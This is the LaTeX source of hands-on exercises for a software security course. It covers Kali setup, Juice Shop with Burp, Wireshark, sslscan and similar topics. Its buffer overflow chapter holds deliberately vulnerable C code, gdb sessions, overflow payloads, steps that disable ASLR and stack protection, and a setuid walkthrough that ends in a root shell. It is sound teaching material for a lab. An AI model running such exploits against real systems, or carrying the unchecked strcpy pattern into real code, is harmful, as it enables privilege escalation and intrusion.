\documentclass[a4paper,11pt,notitlepage]{report}
% Henrik Lund Kramshoej, February 2001
% hlk@security6.net,
% My standard packages
\usepackage{zencurity-network-exercises}

\begin{document}

\rm
\selectlanguage{english}

\newcommand{\emne}[1]{Software Security course}
\newcommand{\kursus}[1]{Software Security course}
\newcommand{\kursusnavn}[1]{Software Security course\\ exercises}

\mytitle{Software Security}{exercises}

\pagenumbering{roman}


\setcounter{tocdepth}{0}

\normal

{\color{titlecolor}\tableofcontents}
%\listoffigures - not used
%\listoftables - not used

\normal
\pagestyle{fancyplain}
\chapter*{\color{titlecolor}Preface}
\markboth{Preface}{}

This material is prepared for use in \emph{\kursus} and was prepared by
Henrik Lund Kramshoej, \link{http://www.zencurity.com} .
It describes the networking setup and
applications for trainings and courses where hands-on exercises are needed.

Further a presentation is used which is available as PDF from kramse@Github\\
Look for \jobname in the repo security-courses.

These exercises are expected to be performed in a training setting with network connected systems. The exercises use a number of tools which can be copied and reused after training. A lot is described about setting up your workstation in the repo

\link{https://github.com/kramse/kramse-labs}



\section*{\color{titlecolor}Prerequisites}

This material expect that participants have a working knowledge of
TCP/IP from a user perspective. Basic concepts such as web site addresses and email should be known as well as IP-addresses and common protocols like DHCP.

\vskip 1cm
Have fun and learn
\eject

% =================== body of the document ===============
% Arabic page numbers
\pagenumbering{arabic}
\rhead{\fancyplain{}{\bf \chaptername\ \thechapter}}

% Main chapters
%---------------------------------------------------------------------
% gennemgang af emnet
% check questions

\chapter*{\color{titlecolor}Exercise content}
\markboth{Exercise content}{}

Most exercises follow the same procedure and has the following content:
\begin{itemize}
\item {\bf Objective:} What is the exercise about, the objective
\item {\bf Purpose:} What is to be the expected outcome and goal of doing this exercise
\item {\bf Suggested method:} suggest a way to get started
\item {\bf Hints:} one or more hints and tips or even description how to
do the actual exercises
\item {\bf Solution:} one possible solution is specified
\item {\bf Discussion:} Further things to note about the exercises, things to remember and discuss
\end{itemize}

Please note that the method and contents are similar to real life scenarios and does not detail every step of doing the exercises. Entering commands directly from a book only teaches typing, while the exercises are designed to help you become able to learn and actually research solutions.


\chapter{Download Kali Linux Revealed (KLR) Book 10 min}
\label{ex:sw-downloadKLR}


\hlkimage{3cm}{kali-linux-revealed.jpg}

\emph{Kali Linux Revealed  Mastering the Penetration Testing Distribution}


{\bf Objective:}\\
We need a Kali Linux for running tools during the course. This is open source, and the developers have released a whole book about running Kali Linux.

This is named Kali Linux Revealed (KLR)

{\bf Purpose:}\\
We need to install Kali Linux in a few moments, so better have the instructions ready.

{\bf Suggested method:}\\
Create folders for educational materials. Go to \link{https://www.kali.org/download-kali-linux-revealed-book/}
Read and follow the instructions for downloading the book.

{\bf Solution:}\\
When you have a directory structure for download for this course, and the book KLR in PDF you are done.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.

Kali Linux is a free pentesting platform, and probably worth more than \$10.000

The book KLR is free, but you can buy/donate, and I recommend it.

\chapter{Check your Kali VM, run Kali Linux 30 min}
\label{ex:sw-basicVM}

\hlkimage{10cm}{kali-linux.png}

{\bf Objective:}\\
Make sure your virtual machine is in working order.

We need a Kali Linux for running tools during the course.

{\bf Purpose:}\\
If your VM is not installed and updated we will run into trouble later.

{\bf Suggested method:}\\
Go to \link{https://github.com/kramse/kramse-labs/}

Read the instructions for the setup of a Kali VM.

{\bf Hints:}\\
If you allocate enough memory and disk you wont have problems.

{\bf Solution:}\\
When you have a updated virtualisation software and Kali Linux, then we are good.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.

Kali Linux includes many hacker tools and should be known by anyone working in infosec.

\chapter{Check your Debian VM 10 min}
\label{ex:sw-basicDebianVM}

\hlkimage{3cm}{debian-9.png}

{\bf Objective:}\\
Make sure your virtual Debian 9 machine is in working order.

We need a Debian 9 Linux for running a few extra tools during the course.

{\Large \bf This is a bonus exercise - only one Debian is needed per team.}

{\bf Purpose:}\\
If your VM is not installed and updated we will run into trouble later.

{\bf Suggested method:}\\
Go to \link{https://github.com/kramse/kramse-labs/}

Read the instructions for the setup of a Kali VM.

{\bf Hints:}\\

{\bf Solution:}\\
When you have a updated virtualisation software and Kali Linux, then we are good.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.



\chapter{Investigate /etc 10 min}
\label{ex:sw-basicLinuxetc}


{\bf Objective:}\\
We will investigate the /etc directory on Linux. We need a Debian 9 Linux and a Kali Linux, to compare

{\bf Purpose:}\\
Start seeing example configuration files, including:
\begin{itemize}
  \item User database \verb+/etc/passwd+ and \verb+/etc/group+
  \item The password database \verb+/etc/shadow+
\end{itemize}

{\bf Suggested method:}\\
Boot your Linux VMs, log in

Investigate permissions for the user database files \verb+passwd+ and \verb+shadow+

{\bf Hints:}\\
Linux has many tools for viewing files, the most efficient would be less.

\begin{alltt}
hlk@debian:~$ cd /etc
hlk@debian:/etc$ ls -l shadow passwd
-rw-r--r-- 1 root root   2203 Mar 26 17:27 passwd
-rw-r----- 1 root shadow 1250 Mar 26 17:27 shadow
hlk@debian:/etc$ ls
... all files and directories shown, investigate more if you like
\end{alltt}

Showing a single file: \verb+less /etc/passwd+ and press q to quit

Showing multiple files: \verb+less /etc/*+ then :n for next and q for quit

\begin{alltt}
Trying reading the shadow file as your regular user:
user@debian-9-lab:/etc$ cat /etc/shadow
cat: /etc/shadow: Permission denied
\end{alltt}

Why is that? Try switching to root, using su or sudo, and redo the command.

{\bf Solution:}\\
When you have seen the most basic files you are done.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.

Sudo is a tool often used for allowing users to perform certain tasks as the super user. The tool is named from superuser do! \link{https://en.wikipedia.org/wiki/Sudo}



\chapter{Run OWASP Juice Shop 45 min}
\label{ex:sw-startjuice}

\hlkimage{3cm}{JuiceShop_Logo_100px.png}

{\bf Objective:}\\
Lets try starting the OWASP Juice Shop

{\bf Purpose:}\\
We will be doing some web hacking where you will be the hacker. There
will be an application we try to hack, designed to
optimise your learning.

It is named JuiceShop which is written in JavaScript

{\bf Suggested method:}\\
Go to \link{https://github.com/bkimminich/juice-shop}

Read the instructions for running juice-shop - docker is a simple way.

What you need

You need to have browsers and a proxy, plus a basic knowledge of HTTP.

If you could install Firefox it would be great, and we will use the
free version of Burp Suite, so please make sure you can run Java and
download the free version from Portswigger from:

\link{https://portswigger.net/burp/communitydownload}


{\bf Hints:}\\
The application is very modern, very similar to real applications.

The Burp proxy is an advanced tool! Dont be scared, we will use small parts at different times.

{\bf Solution:}\\
When you have a running Juice Shop web application in your team, then we are good.

{\bf Discussion:}\\
It has lots of security problems which can be used for learning
hacking, and thereby how to secure your applications. It is  related
to the OWASP.org Open Web Application Security Project which also has a
lot of resources.

Sources:\\
\url{https://github.com/bkimminich/juice-shop}\\
\url{https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project}

It is recommended to buy the \emph{Pwning OWASP Juice Shop Official companion guide to the OWASP Juice Shop} from \link{https://leanpub.com/juice-shop} - suggested price USD 5.99



\chapter{Setup JuiceShop environment, app and proxy - up to 60min}
\label{ex:js-burp}

{\bf Objective:}\\
Run JuiceShop with Burp proxy.

Start JuiceShop and make sure it works, visit using browser.

Then add a web proxy in-between. We will use Burp suite which is a commercial product, in the community edition.

{\bf Purpose:}\\
We will learn more about web applications as they are a huge part of the applications used in enterprises and on the internet. Most mobile apps are also web applications in disguise.

By inserting a web proxy we can inspect the data being sent between browsers and the application.

{\bf Suggested method:}\\
You need to have browsers and a proxy, plus a basic knowledge of HTTP.

If you could install Firefox it would be great, and we will use the
free version of Burp Suite, so please make sure you can run Java and
download the free version \emph{plain JAR file} from Portswigger from:

\link{https://portswigger.net/burp/communitydownload}

follow the Getting Started instructions at:\\
\link{https://support.portswigger.net/customer/portal/articles/1816883-getting-started-with-burp-suite}


{\bf Hints:}\\
Recommend running Burp on the default address and port 127.0.0.1 port 8080.

Note: Burp by default has \verb+intercept is on+ in the Proxy tab, press the button to allow data to flow.

\hlkimage{10cm}{burp-default-proxy-intercept.png}

Then setting it as proxy in Firefox:

\hlkimage{10cm}{firefox-connection-burp.png}

{\bf Solution:}\\
When web sites and servers start popping up in the Target tab, showing the requests and responses - you are done.

Your browser will alert you when visiting TLS enabled sites, HTTPS certificates do not match, as Burp is doing a person-in-the-middle. You need to select advanced and allow this to continue.

{\bf Discussion:}\\
Since Burp is often updated I use a small script for starting Burp which I save in \verb+~/bin/burp+ - dont forget to add to PATH and \verb+chmod +x bin/burp+.

\begin{alltt}
#! /bin/sh
DIRNAME=`dirname $0`
BURP=`ls -1tra $DIRNAME/burp*.jar | tail -1`
java -jar -Xmx6g $BURP &
\end{alltt}

\chapter{Run small programs: Python, Shell script 20min}
\label{ex:small-python}

{\bf Objective:}\\
Be able to create small scripts using Python and Unix shell.

{\bf Purpose:}\\
Often it is needed to automate some task. Using scripting languages allows one to quickly automate.

Python is a very popular programming language. The Python language
is an interpreted, high-level, general-purpose programming language. Created by Guido van Rossum and first released in 1991.


You can read more about Python at:\\
\url{https://www.python.org/about/gettingstarted/} and \\
\url{https://en.wikipedia.org/wiki/Python_(programming_language)}

Shell scripting is another method for automating things on Unix. There are a number of built-in shell programs available.

You should aim at using basic shell scripts, to be used with \verb+/bin/sh+ - as this is the most portable Bourne shell.



{\bf Suggested method:}\\
Both shell and Python is often part of Linux installations.

Use and editor, leafpad, atom, VI/VIM, joe, EMACS, Nano ...

Create two files, I named them \verb+python-example.py+ and \verb+shell-example.sh+:

\VerbatimInput{python-example.py}

\VerbatimInput{shell-example.sh}

Unix does not require the file type .py or .sh, but it is often recommended to use it. To be able to run these programs you need to make them executable. Use the commands to set execute bit and run them:



Note: Python is available in two versions, version 2 and version 3. You should aim at running only version 3, as the older one is deprecated.

{\bf Hints:}\\
\begin{alltt}
$ chmod +x python-example.py shell-example.sh

$ ./python-example.py
21

$ ./shell-example.sh
Todays date in ISO format is: 2019-08-29
This system has 32 /etc/passwd users

\end{alltt}

{\bf Solution:}\\
When you have tried making both a shell script and a python program, you are done.

{\bf Discussion:}\\
If you want to learn better shell scripting there is an older but very recommended book,

\emph{Classic Shell Scripting
Hidden Commands that Unlock the Power of Unix}
By Arnold Robbins, Nelson Beebe. Publisher: O'Reilly Media
Release Date: December 2008
 \link{http://shop.oreilly.com/product/9780596005955.do}


\chapter{Run parts of a Django tutorial 30min}
\label{ex:django-intro}

{\bf Objective:}\\
Talk about web applications, how they are made.

{\bf Purpose:}\\
Know how you can get started using a framework, like Django\\ \link{https://www.djangoproject.com/}

{\bf Suggested method:}\\
We will visit a Django tutorial and talk about the benefits from using existing frameworks.

{\bf Hints:}\\
Input validation is a problem most applications face. Using Django a lot of functionality is available for input validation.

Take a look at Form and field validation:\\
\link{https://docs.djangoproject.com/en/2.2/ref/forms/validation/}

You can also write your own validators, and should centralize validation in your own applications.

\begin{minted}[fontsize=\small]{python}

  from django.core.exceptions import ValidationError
  from django.utils.translation import gettext_lazy as _

  def validate_even(value):
      if value % 2 != 0:
          raise ValidationError(
              _('%(value)s is not an even number'),
              params={'value': value},
          )
\end{minted}

Example from:
\link{https://docs.djangoproject.com/en/2.2/ref/validators/}

{\bf Solution:}\\
When we have covered basics of what Django is, what frameworks provide and seen examples, we are done.

{\bf Discussion:}\\
Django is only an example, other languages and projects exist.


\chapter{Buffer Overflow 101 - 30-40min}
\label{ex:bufferoverflow}


{\bf Objective:}\\
Run a demo program with invalid input - too long.

{\bf Purpose:}\\
See how easy it is to cause an exception.

{\bf Suggested method:}\\

\begin{list2}
\item Small demo program \verb+demo.c+
\item Has built-in shell code, function \verb+the_shell+
\item Compile:
\verb+gcc -o demo demo.c+
\item Run program
\verb+./demo test+
\item Goal: Break and insert return address
\end{list2}

\begin{minted}[fontsize=\footnotesize]{c}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char **argv)
{      char buf[10];
        strcpy(buf, argv[1]);
        printf("%s\n",buf);
}
int the_shell()
{  system("/bin/dash");  }
\end{minted}

NOTE: this demo is using the dash shell, not bash - since bash drops privileges and won't work.

Use GDB to repeat the demo by the instructor.

{\bf Hints:}\\
First make sure it compiles:
\begin{alltt}
\$ gcc -o demo demo.c
\$ ./demo hejsa
hejsa
\end{alltt}

Make sure you have tools installed:
\begin{alltt}
apt-get install gdb
\end{alltt}

Then run with debugger:

\begin{alltt}
\$ gdb demo
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from demo...(no debugging symbols found)...done.
(gdb) {\bf
(gdb) run `perl -e "print 'A'x22; print 'B'; print 'C'"`}
Starting program: /home/user/demo/demo `perl -e "print 'A'x22; print 'B'; print 'C'"`
AAAAAAAAAAAAAAAAAAAAAABC

Program received signal SIGSEGV, Segmentation fault.
0x0000434241414141 in ?? ()
(gdb)
// OR
(gdb) {\bf
(gdb) run $(perl -e "print 'A'x22; print 'B'; print 'C'")}
Starting program: /home/user/demo/demo `perl -e "print 'A'x22; print 'B'; print 'C'"`
AAAAAAAAAAAAAAAAAAAAAABC

Program received signal SIGSEGV, Segmentation fault.
0x0000434241414141 in ?? ()
(gdb)

\end{alltt}

Note how we can see the program trying to jump to address with our data. Next step would be to make sure the correct values end up on the stack.

{\bf Solution:}\\
When you can run the program with debugger as shown, you are done.

{\bf Discussion:}\\

the layout of the program - and the address of the \verb+the_shell+ function can be seen using the command \verb+nm+:
\begin{alltt}\footnotesize
\$ nm demo
0000000000201040 B __bss_start
0000000000201040 b completed.6972
                 w __cxa_finalize@@GLIBC_2.2.5
0000000000201030 D __data_start
0000000000201030 W data_start
0000000000000640 t deregister_tm_clones
00000000000006d0 t __do_global_dtors_aux
0000000000200de0 t __do_global_dtors_aux_fini_array_entry
0000000000201038 D __dso_handle
0000000000200df0 d _DYNAMIC
0000000000201040 D _edata
0000000000201048 B _end
0000000000000804 T _fini
0000000000000710 t frame_dummy
0000000000200dd8 t __frame_dummy_init_array_entry
0000000000000988 r __FRAME_END__
0000000000201000 d _GLOBAL_OFFSET_TABLE_
                 w __gmon_start__
000000000000081c r __GNU_EH_FRAME_HDR
00000000000005a0 T _init
0000000000200de0 t __init_array_end
0000000000200dd8 t __init_array_start
0000000000000810 R _IO_stdin_used
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
0000000000200de8 d __JCR_END__
0000000000200de8 d __JCR_LIST__
                 w _Jv_RegisterClasses
0000000000000800 T __libc_csu_fini
0000000000000790 T __libc_csu_init
                 U __libc_start_main@@GLIBC_2.2.5
0000000000000740 T main
                 U puts@@GLIBC_2.2.5
0000000000000680 t register_tm_clones
0000000000000610 T _start
                 U strcpy@@GLIBC_2.2.5
                 U system@@GLIBC_2.2.5
000000000000077c T the_shell
0000000000201040 D __TMC_END__
\end{alltt}

The bad news is that this function is at an address \verb+000000000000077c+ which is hard to input using our buffer overflow, please try \smiley We cannot write zeroes, since strcpy stop when reaching a null byte.

We can compile our program as 32-bit using this, and disable things like ASLR, stack protection also:
\begin{alltt}
sudo apt-get install gcc-multilib
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
gcc -m32 -o demo demo.c -fno-stack-protector -z execstack -no-pie
\end{alltt}

Then you can produce 32-bit executables:
\begin{alltt}\footnotesize
// Before:
user@debian-9-lab:~/demo$ file demo
demo: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=82d83384370554f0e3bf4ce5030f6e3a7a5ab5ba, not stripped
// After - 32-bit
user@debian-9-lab:~/demo$ gcc -m32 -o demo demo.c
user@debian-9-lab:~/demo$ file demo
demo: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5fe7ef8d6fd820593bbf37f0eff14c30c0cbf174, not stripped
\end{alltt}

And layout:
\begin{alltt}\footnotesize
0804a024 B __bss_start
0804a024 b completed.6587
0804a01c D __data_start
0804a01c W data_start
...
080484c0 T the_shell
0804a024 D __TMC_END__
080484eb T __x86.get_pc_thunk.ax
080483a0 T __x86.get_pc_thunk.bx
\end{alltt}


Successful execution would look like this - from a Raspberry Pi:
\begin{alltt}\footnotesize
\$ gcc -o demo demo.c
\$ nm demo | grep the_shell
000104ec T the_shell
\$

...
(gdb) run `perl -e " print 'A'x16; print chr(0xec).chr(04).chr(0x01);" `
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/pi/demo/demo `perl -e " print 'A'x16; print chr(0xec) . chr(04)  . chr (0x01);" `
AAAAAAAAAAAAAAAA
\$
\end{alltt}

Started a new shell.

you can now run the "exploit" - which is the shell function AND the misdirection of the instruction flow by overflow:
\begin{alltt}
pi@raspberrypi:~/demo $ gcc -o demo demo.c
pi@raspberrypi:~/demo $ sudo chown root.root demo
pi@raspberrypi:~/demo $ sudo chmod +s demo
pi@raspberrypi:~/demo $ id
uid=1000(pi) gid=1000(pi) grupper=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
pi@raspberrypi:~/demo $ ./demo `perl -e " print 'A'x16; print chr(0xec).chr(04).chr(0x01);" `
AAAAAAAAAAAAAAAA
# id
uid=1000(pi) gid=1000(pi) euid=0(root) egid=0(root) grupper=0(root),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi),1000(pi)
#

\end{alltt}


\chapter{SSL/TLS scanners 15 min}
\label{ex:sslscan}

{\bf Objective:}\\
Try the Online Qualys SSLLabs scanner \link{https://www.ssllabs.com/}
Try the command line tool sslscan checking servers - can check both HTTPS and non-HTTPS protocols!

{\bf Purpose:}\\
Learn how to efficiently check TLS settings on remote services.

{\bf Suggested method:}\\
Run the tool against a couple of sites of your choice.

\begin{alltt}\small
root@kali:~# sslscan --ssl2 web.kramse.dk
Version: 1.10.5-static
OpenSSL 1.0.2e-dev xx XXX xxxx

Testing SSL server web.kramse.dk on port 443
...
  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048

Subject:  *.kramse.dk
Altnames: DNS:*.kramse.dk, DNS:kramse.dk
Issuer:   AlphaSSL CA - SHA256 - G2
\end{alltt}

Also run it without \verb+--ssl2+ and against SMTPTLS if possible.

{\bf Hints:}\\
Originally sslscan is from \link{http://www.titania.co.uk} but use the version on Kali, install with apt if not installed.

{\bf Solution:}\\
When you can run and understand what the tool does, you are done.

{\bf Discussion:}\\
SSLscan can check your own sites, while Qualys SSLLabs only can test from hostname


\chapter{Real Vulnerabilities}
\label{ex:real-vulns}



{\bf Objective:}\\
Look at real vulnerabilities. Choose a few real vulnerabilities, prioritize them.

{\bf Purpose:}\\
See that the error types described in the book - the book from 2007 - is still causing problems.

{\bf Suggested method:}\\
We will use the recent Exim errors as examples. Download the descriptions from:
\begin{list2}
\item Exim RCE CVE-2019-10149 June\\ \url{https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt}

\item Exim RCE CVE-2019-15846 September\\
\url{https://exim.org/static/doc/security/CVE-2019-15846.txt}
\end{list2}

When done with these think about your own dependencies. What software do you depend on? How many vulnerabilities and CVEs are for that?

I depend on the OpenBSD operating system, and it has flaws too:\\
\url{https://www.openbsd.org/errata65.html}

You may depend on OpenSSH from the OpenBSD project, which has had a few problems too:\\
\url{https://www.openssh.com/security.html}

{\bf Hints:}\\
Remote Code Execution can be caused by various things, but most often some kind of input validation failure.

{\bf Solution:}\\
When you have identified the specific error type, is it buffer overflows? Then you are done.

{\bf Discussion:}\\
How do you feel about running internet services.

Lets discuss how we can handle running insecure code.

What other methods can we use to restrict problems caused by similar vulnerabilities.


\chapter{JuiceShop Attacks 60min}
\label{ex:juiceshop-attack}

\hlkimage{2cm}{JuiceShop_Logo_100px.png}

 {\bf Objective:}\\
Hack a web application!

Try a few attacks in the JuiceShop with web proxy

\begin{quote}
The OWASP Juice Shop is a pure web application implemented in JavaScript. In the
frontend the popular AngularJS framework is used to create a so-called Single Page
Application. The user interface layout is provided by Twitter's Bootstrap framework - which
works nicely in combination with AngularJS.
JavaScript is also used in the backend as the exclusive programming language: An Express
application hosted in a Node.js server delivers the client-side code to the browser. It also
provides the necessary backend functionality to the client via a RESTful API.

...

The vulnerabilities found in the OWASP Juice Shop are categorized into several different
classes. Most of them cover different risk or vulnerabiliy types from well-known lists or
documents, such as OWASP Top 10 or MITRE's Common Weakness Enumeration. The
following table presents a mapping of the Juice Shop's categories to OWASP and CWE
(without claiming to be complete).
\end{quote}

\hlkimage{10cm}{juiceshop-mappings.png}
Source: \emph{Pwning OWASP Juice Shop}


 {\bf Purpose:}\\
 Try out some of the described web application flaws in a controlled environment. See how an attacker would be able to gather information and attack through HTTP, browser and proxies.

 {\bf Suggested method:}\\
Start the web application, start Burp or another proxy - start your browser.

Access the web application through your browser and get a feel for how it works. First step is to register your user, before you can shop.

Dont forget to use web developer tools like the JavaScript console!

Then afterwards find and try to exploit vulnerabilities, using the book from Björn and starting with some easy ones:

Suggested list of starting vulns:
\begin{list2}
\item Admin Section Access the Admin Section
\item Error handling Provoke and error
\item Forged Feedback Post some feedback in another users name.
\item Access a confidential document
\item Forgotten Sales Backup Access a salesman's forgotten backup file.
\item Retrieve a list of all user credentials via SQL Injection
\end{list2}


 {\bf Hints:}\\
 The complete guide \emph{Pwning OWASP Juice Shop}
written by Björn Kimminich is available as PDF which you can buy, or you can read it online at:\\
\url{https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/}

 {\bf Solution:}\\
 You decide for how long you want to play with JuiceShop.

 Do know that some attackers on the internet spend all their time researching, exploiting and abusing web applications.

 {\bf Discussion:}\\
The vulnerabilities contained in systems like JuiceShop mimic real ones, and do a very good job. You might not think this is possible in real applications, but there is evidence to the contrary.

Using an app like JS instead of real applications with flaws allow you to spend less on installing apps, and more on exploiting.


\chapter{Wireshark 15 min}
\label{ex:wireshark-install}

\hlkimage{10cm}{wireshark-http.png}


{\bf Objective:}\\
Try the program Wireshark locally your workstation, or tcpdump

You can run Wireshark on your host too, if you want.

{\bf Purpose:}\\
Installing Wireshark will allow you to analyse packets and protocols

See real network traffic, also know that a lot of information is available and not encrypted.

Note the three way handshake between hosts running TCP. You can either use a browser or command line tools like cURL while capturing

\begin{alltt}
curl http://www.zencurity.com
\end{alltt}


{\bf Suggested method:}\\
Run Wireshark from your Kali Linux

Open Wireshark and start a capture\\
Then in another window execute the ping program while sniffing

or perform a Telnet connection while capturing data

{\bf Hints:}\\
PCAP is a packet capture library allowing you to read packets from the network.
Tcpdump uses libpcap library to read packet from the network cards and save them.
Wireshark is a graphical application to allow you to browse through traffic, packets and protocols.

It is already on your Kali Linux, or do: \verb+apt-get install wireshark+

When running on Linux the network cards are usually named eth0 for the first Ethernet and wlan0 for the first Wireless network card. In Windows the names of the network cards are long and if you cannot see which cards to use then try them one by one.

{\bf Solution:}\\
When you have collected some HTTP/TCP sessions you are done.

If you want to capture packets as a non-root user on Debian, then use the command to add a Wireshark group:
\begin{alltt}
sudo dpkg-reconfigure wireshark-common
\end{alltt}

and add your user to this:
\begin{alltt}
sudo gpasswd -a $USER wireshark
\end{alltt}
Dont forget to logout/login to pick up this new group.

{\bf Discussion:}\\
Wireshark is just an example other packet analyzers exist, some commercial and some open source like Wireshark

We can download a lot of packet traces from around the internet, we might use examples from\\
\link{https://www.bro.org/community/traces.html}




\chapter{Try American fuzzy lop}
\label{ex:american-fuzzy-lop}

Try American fuzzy lop http://lcamtuf.coredump.cx/afl/

{\bf Objective:}

{\bf Purpose:}

{\bf Suggested method:}

{\bf Hints:}

{\bf Solution:}

{\bf Discussion:}


\end{document}

\chapter{Writing and exploiting a small buffer overflow}
\label{ex:writing-exploit-buffer}

Writing and exploiting a small buffer overflow

{\bf Objective:}

{\bf Purpose:}

{\bf Suggested method:}

{\bf Hints:}

{\bf Solution:}

{\bf Discussion:}


\chapter{Run debugger}
\label{ex:debugger-101}

{\bf Objective:}

{\bf Purpose:}

{\bf Suggested method:}

{\bf Hints:}

{\bf Solution:}

{\bf Discussion:}



\chapter{Django String Handling}
\label{ex:django-string}

Recommendations for handling strings, how does Python help, how does Django handle strings, and input validation

\chapter{SYN flooding exercise}
\label{ex:syn-flood}

{\bf Objective:}

{\bf Purpose:}

{\bf Suggested method:}

{\bf Hints:}

{\bf Solution:}

{\bf Discussion:}


\chapter{Securing the JuiceShop}
\label{ex:secure-juiceshop}

Layout a plan for securing the Juice Shop

{\bf Objective:}

{\bf Purpose:}

{\bf Suggested method:}

{\bf Hints:}

{\bf Solution:}

{\bf Discussion:}


\chapter{How should software be designed today}
\label{ex:software-design-today}

{\bf Objective:}

{\bf Purpose:}

{\bf Suggested method:}

{\bf Hints:}

{\bf Solution:}

{\bf Discussion:}




\end{document}
